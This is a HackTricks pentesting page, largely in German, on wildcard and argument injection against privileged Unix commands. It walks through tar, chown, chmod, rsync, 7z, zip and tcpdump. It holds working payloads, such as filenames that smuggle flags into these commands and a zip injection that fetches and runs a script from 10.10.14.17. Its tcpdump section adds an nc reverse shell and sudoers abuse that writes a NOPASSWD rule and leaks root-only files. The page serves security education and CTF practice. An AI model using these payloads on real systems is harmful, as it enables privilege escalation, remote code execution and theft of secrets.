# Wildcards: Nützliche Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** tritt auf, wenn ein privilegiertes Skript ein Unix-Binary wie `tar`, `chown`, `rsync`, `zip`, `7z`, … mit einem nicht in Anführungszeichen gesetzten Wildcard wie `*` ausführt.  
> Da die Shell das Wildcard **before** der Ausführung des Binaries expanded, kann ein Angreifer, der Dateien im Arbeitsverzeichnis anlegen kann, Dateinamen erzeugen, die mit `-` beginnen, sodass sie als **Optionen statt Daten** interpretiert werden und effektiv beliebige Flags oder sogar Befehle einschmuggeln.

Diese Seite sammelt die nützlichsten Primitiven, aktuelle Forschung und moderne Erkennungen für 2023–2025.

## chown / chmod

You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wenn root später etwas wie folgt ausführt:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` wird injiziert, wodurch *alle* passenden Dateien die Eigentümer- und Berechtigungsinformationen von `/root/secret``file` übernehmen.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (kombinierter Angriff).
Siehe auch das klassische DefenseCode-Paper für Details.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Führe beliebige Befehle aus, indem man die **checkpoint**-Funktion missbraucht:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Wenn root z. B. `tar -czf /root/backup.tgz *` ausführt, wird `shell.sh` als root ausgeführt.

### bsdtar / macOS 14+

Der standardmäßige `tar` auf aktuellen macOS (basierend auf `libarchive`) implementiert `--checkpoint` *nicht*, aber du kannst trotzdem Codeausführung mit dem **--use-compress-program**-Flag erreichen, das es erlaubt, einen externen Kompressor anzugeben.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wenn ein privilegiertes Skript `tar -cf backup.tar *` ausführt, wird `/bin/sh` gestartet.

---

## rsync

`rsync` ermöglicht es, die entfernte Shell oder sogar das entfernte Binary über Kommandozeilen-Flags zu überschreiben, die mit `-e` oder `--rsync-path` beginnen:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Wenn root später das Verzeichnis mit `rsync -az * backup:/srv/` archiviert, startet das injizierte flag deine Shell auf der entfernten Seite.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Selbst wenn das privilegierte Skript *vorsorglich* das wildcard mit `--` voranstellt (um das Optionenparsing zu stoppen), unterstützt das 7-Zip-Format **file list files**, indem der Dateiname mit `@` vorangestellt wird. Die Kombination davon mit einem symlink ermöglicht es dir, *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Wenn root etwas wie Folgendes ausführt:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip versucht `root.txt` (→ `/etc/shadow`) als Dateiliste zu lesen und bricht ab, wobei es **den Inhalt auf stderr ausgibt**.

---

## zip

Two very practical primitives exist when an application passes user-controlled filenames to `zip` (either via a wildcard or by enumerating names without `--`).

- RCE via test hook: `-T` aktiviert „test archive“ und `-TT <cmd>` ersetzt den Tester durch ein beliebiges Programm (Langform: `--unzip-command <cmd>`). Wenn du Dateinamen injizieren kannst, die mit `-` beginnen, verteile die Flags auf verschiedene Dateinamen, sodass das Parsen von Kurzoptionen funktioniert:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Hinweise
- Versuche NIEMALS einen einzelnen Dateinamen wie `'-T -TT <cmd>'` — Kurzoptionen werden zeichenweise geparst und das wird fehlschlagen. Verwende separate Argumente wie gezeigt.
- Wenn Schrägstriche aus Dateinamen von der App entfernt werden, hole die Datei von einem reinen Host/IP (Standardpfad `/index.html`) und speichere sie lokal mit `-O`, dann führe sie aus.
- Du kannst das Parsen mit `-sc` (show processed argv) oder `-h2` (more help) debuggen, um zu verstehen, wie deine Token konsumiert werden.

Beispiel (lokales Verhalten auf zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Wenn die Web-Schicht die stdout/stderr von `zip` ausgibt (häufig bei naiven Wrappers), erscheinen injizierte Flags wie `--help` oder Fehler durch falsche Optionen in der HTTP-Antwort, was die command-line injection bestätigt und das Payload-Tuning erleichtert.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

Die folgenden Befehle wurden in modernen CTFs und realen Umgebungen missbraucht. Der Payload wird immer als *Dateiname* in einem beschreibbaren Verzeichnis erstellt, das später mit einem wildcard verarbeitet wird:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Dateiinhalt lesen |
| `flock` | `-c <cmd>` | Befehl ausführen |
| `git`   | `-c core.sshCommand=<cmd>` | Befehlsausführung via git über SSH |
| `scp`   | `-S <cmd>` | Beliebiges Programm starten anstelle von ssh |

Diese Primitives sind weniger verbreitet als die *tar/rsync/zip*-Klassiker, aber beim hunting einen Blick wert.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Wenn eine eingeschränkte Shell oder ein Vendor-Wrapper eine `tcpdump`-Kommandozeile durch Aneinanderhängen von vom Benutzer kontrollierten Feldern (z. B. einem "file name"-Parameter) ohne strikte Quoting-/Validierung erstellt, kann man zusätzliche `tcpdump`-Flags einschmuggeln. Die Kombination aus `-G` (zeitbasierte Rotation), `-W` (Begrenzung der Dateianzahl) und `-z <cmd>` (Post-Rotate-Befehl) führt zu beliebiger Befehlsausführung als der Benutzer, der tcpdump ausführt (auf Appliances oft root).

Preconditions:

- Sie können `argv` beeinflussen, das an `tcpdump` übergeben wird (z. B. via einen Wrapper wie `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Der Wrapper sanitisiert keine Leerzeichen oder `-`-präfigierten Tokens im file name-Feld.

Klassischer PoC (führt ein reverse shell-Skript aus einem beschreibbaren Pfad aus):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` erzwingt eine sofortige Rotation nach dem ersten passenden Paket.
- `-z <cmd>` führt den Post-Rotate-Befehl einmal pro Rotation aus. Viele Builds führen `<cmd> <savefile>` aus. Wenn `<cmd>` ein Skript/Interpreter ist, stelle sicher, dass die Argumentbehandlung zu deinem Payload passt.

No-removable-media variants:

- Wenn du eine andere Primitive zum Schreiben von Dateien hast (z. B. ein separates Befehls-Wrapper, das Ausgabeumleitung erlaubt), lege dein Skript in einen bekannten Pfad und rufe `-z /bin/sh /path/script.sh` oder `-z /path/script.sh` auf, je nach Plattform-Semantik.
- Manche Vendor-Wrapper rotieren in vom Angreifer kontrollierbare Pfade. Wenn du den rotierten Pfad beeinflussen kannst (symlink/directory traversal), kannst du `-z` so lenken, dass es Inhalte ausführt, die du vollständig kontrollierst, ohne externe Medien.

---

## sudoers: tcpdump with wildcards/additional args → beliebiges Schreiben/Lesen und root

Sehr häufiges sudoers-Anti-Pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Probleme
- Das `*` glob und permissive Muster beschränken nur das erste `-w`-Argument. `tcpdump` akzeptiert mehrere `-w`-Optionen; die letzte gewinnt.
- Die Regel fixiert andere Optionen nicht, daher sind `-Z`, `-r`, `-V` usw. erlaubt.

Primitiven
- Zielpfad mit einem zweiten `-w` überschreiben (das erste erfüllt nur sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal innerhalb des ersten `-w`, um dem constrained tree zu entkommen:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Erzwinge Besitz der Ausgabe mit `-Z root` (erstellt überall root-eigene Dateien):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Arbitrary-content write durch Abspielen eines präparierten PCAPs via `-r` (z. B. um eine sudoers-Zeile abzulegen):

<details>
<summary>Erstelle ein PCAP, das die exakte ASCII payload enthält, und schreibe es als root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Beliebiges Dateilesen/Geheimnis leak mit `-V <file>` (interpretiert eine Liste von savefiles). Fehlermeldungen geben oft Zeilen aus und leaken Inhalte:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referenzen

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
